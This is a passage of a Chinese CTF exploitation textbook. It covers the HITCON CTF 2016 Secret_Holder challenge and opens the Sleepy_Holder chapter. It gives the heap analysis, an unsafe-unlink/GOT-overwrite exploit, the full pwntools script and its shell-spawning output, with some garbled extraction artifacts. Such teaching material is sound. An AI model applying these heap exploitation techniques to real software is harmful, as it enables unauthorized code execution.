| ||||| ; JMP XREF from 0x00400c1d (sub.Which_Secret_do_you_
want_to_renew_b1e)
| `````---> 0x00400c52 mov rax, qword [local_8h]
| 0x00400c56 xor rax, qword fs:[0x28]
| ,= 0x00400c66 leave
\ 0x00400c67 ret
该函数首先判断对应的 flag 是否为 1，即 secret 是否已经存在，如果不存在，则读
入 secret，否则函数直接返回。
漏洞利用
总结一下我们知道的东西：
small secret: small chunk, 40 bytes
small_ptr: 0x006020b0
small_flag: 0x006020c0
big secret: large chunk, 4000 bytes
big_ptr: 0x006020a0
big_flag: 0x006020b8
huge secret: large chunk, 400000 bytes
huge_ptr: 0x006020a8
huge_flag: 0x006020bc
漏洞：
double-free：在 free chunk 的位置 calloc 另一个 chunk，即可再次 free 这个
chunk
use-after-free：由于 double-free，calloc 出来的那个 chunk 被认为是 free
的，但可以使用
1268
6.1.21 pwn HITCONCTF2016 Secret_Holder
有个问题是，400000 bytes 的 huge secret 连 top chunk 都不能满足，此时会调用
sysmalloc() ，通过 brk() 或者 mmap() 为其分配空间，该函数首先判断是
否满足 mmap() 的分配条件，即需求 chunk 的大小大于阀值
mp_.mmap_threshold ，且此进程通过 mmap() 分配的总内存数量
mp_.n_mmaps 小于最大值 mp_.n_mmaps_max ：
/*
If have mmap, and the request size meets the mmap threshold
, and
the system supports mmap, and there are few enough currentl
y
allocated mmapped regions, try to directly map this request
rather than expanding top.
*/
if (av == NULL
|| ((unsigned long) (nb) >= (unsigned long) (mp_.mmap_thre
shold)
&& (mp_.n_mmaps size > mp_.mmap_threshold
&& p->size fd->bk = P
gdb-peda$ x/gx 0x006020a0 + 0x10
0x6020b0: 0x0000000000603010 bk->fd = P
释放 huge secret，即可触发 unsafe unlink：
gdb-peda$ x/6gx 0x00602098
0x602098: 0x0000000000000000 0x0000000000603010
0x6020a8: 0x0000000000603040 0x0000000000602098  PI:EMAIL
payload += "A" * 8
payload += p64(big_ptr) # small_ptr -> big_ptr
renew(1, payload)
renew(2, p64(elf.plt['puts'])) # PI:EMAIL -> puts@plt
renew(1, p64(elf.got['puts'])) # big_ptr -> PI:EMAIL
wipe(2)
puts_addr = u64(io.recvline()[:6] + "\x00\x00")
libc_base = puts_addr - libc.symbols['puts']
one_gadget = libc_base + 0x4525a
log.info("libc base: 0x%x" % libc_base)
log.info("one_gadget address: 0x%x" % one_gadget)
修改 big_ptr 指向 PI:EMAIL ，small_ptr 指向 big_ptr：
gdb-peda$ x/6gx 0x00602098
0x602098: 0x4141414141414141 0x0000000000602018
0x6020a8: 0x4141414141414141 0x00000000006020a0
0x6020b8: 0x0000000000000001 0x0000000000000001
gdb-peda$ x/gx 0x00602018
0x602018 : 0x00007ffff7a91a70
修改 PI:EMAIL 为 puts@plt ，big_ptr 指向 PI:EMAIL ：
1273
6.1.21 pwn HITCONCTF2016 Secret_Holder
gdb-peda$ x/6gx 0x00602098
0x602098: 0x4141414141414141 0x0000000000602020
0x6020a8: 0x4141414141414141 0x00000000006020a0
0x6020b8: 0x0000000000000001 0x0000000000000001
gdb-peda$ x/gx 0x00602018
0x602018 : 0x00000000004006c0
gdb-peda$ x/gx 0x00602020
0x602020 : 0x00007ffff7a7d5d0
此时释放 big secret，其实就是 puts(puts_addr) ，通过偏移计算即可得到 libc
基址和 one-gadget 地址。
pwn
def pwn():
payload = "A" * 0x10
payload += p64(elf.got['puts']) # small_ptr -> PI:EMAIL
renew(1, payload)
renew(1, p64(one_gadget)) # PI:EMAIL -> one_gadget
io.interactive()
最后可以通过两次修改，将 PI:EMAIL 修改为 one-gadget，获得 shell。
开启 ASLR，Bingo!!!
$ python exp.py
[+] Starting local process './SecretHolder': pid 6979
[*] libc base: 0x7f34e24ae000
[*] one_gadget address: 0x7f34e24f325a
[*] Switching to interactive mode
$ whoami
firmy
exploit
1274
6.1.21 pwn HITCONCTF2016 Secret_Holder
完整的 exp 如下：
#!/usr/bin/env python
from pwn import *
#context.log_level = 'debug'
io = process(['./SecretHolder'], env={'LD_PRELOAD':'./libc-2.23.
so'})
elf = ELF('SecretHolder')
libc = ELF('libc-2.23.so')
small_ptr = 0x006020b0
big_ptr = 0x006020a0
def keep(idx):
io.sendlineafter("Renew secret\n", '1')
io.sendlineafter("Huge secret\n", str(idx))
io.sendafter("secret: \n", 'AAAA')
def wipe(idx):
io.sendlineafter("Renew secret\n", '2')
io.sendlineafter("Huge secret\n", str(idx))
def renew(idx, content):
io.sendlineafter("Renew secret\n", '3')
io.sendlineafter("Huge secret\n", str(idx))
io.sendafter("secret: \n", content)
def unlink():
keep(1)
wipe(1)
keep(2) # big
wipe(1) # double free
keep(1) # small # overlapping
keep(3)
wipe(3)
keep(3) # huge
1275
6.1.21 pwn HITCONCTF2016 Secret_Holder
payload = p64(0) # fake prev_size
payload += p64(0x21) # fake size
payload += p64(small_ptr - 0x18) # fake fd
payload += p64(small_ptr - 0x10) # fake bk
payload += p64(0x20) # fake prev_size
payload += p64(0x61a90) # fake size
renew(2, payload)
wipe(3) # unsafe unlink
def leak():
global one_gadget
payload = "A" * 8
payload += p64(elf.got['free']) # big_ptr -> PI:EMAIL
payload += "A" * 8
payload += p64(big_ptr) # small_ptr -> big_ptr
renew(1, payload)
renew(2, p64(elf.plt['puts'])) # PI:EMAIL -> puts@plt
renew(1, p64(elf.got['puts'])) # big_ptr -> PI:EMAIL
wipe(2)
puts_addr = u64(io.recvline()[:6] + "\x00\x00")
libc_base = puts_addr - libc.symbols['puts']
one_gadget = libc_base + 0x4525a
log.info("libc base: 0x%x" % libc_base)
log.info("one_gadget address: 0x%x" % one_gadget)
def pwn():
payload = "A" * 0x10
payload += p64(elf.got['puts']) # small_ptr -> PI:EMAIL
renew(1, payload)
renew(1, p64(one_gadget)) # PI:EMAIL -> one_gadget
io.interactive()
if __name__ == "__main__":
unlink()
leak()
1276
6.1.21 pwn HITCONCTF2016 Secret_Holder
pwn()
参考资料
https://ctftime.org/task/2954
1277
6.1.22 pwn HITCONCTF2016 Sleepy_Holder
6.1.22 pwn HITCONCTF2016
Sleepy_Holder
题目复现
题目解析
漏洞利用
参考资料
下载文件
题目复现
$ file SleepyHolder
SleepyHolder: ELF 64-bit LSB executable, x86-64, version 1 (SYSV
), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,
for GNU/Linux 2.6.24, BuildID[sha1]=46f0e70abd9460828444d7f0975a
8b2f2ddbad46, stripped
$ checksec -f SleepyHolder
RELRO STACK CANARY NX PIE
RPATH RUNPATH FORTIFY Fortified Fortifiable FILE
Partial RELRO Canary found NX enabled No PIE
No RPATH No RUNPATH Yes 0 2 SleepyHo
lder
$ strings libc-2.23.so | grep "GNU C"
GNU C Library (Ubuntu GLIBC 2.23-0ubuntu3) stable release versio
n 2.23, by Roland McGrath et al.
Compiled by GNU CC version 5.3.1 20160413.
64 位程序，开启了 Canary 和 NX，默认开启 ASLR。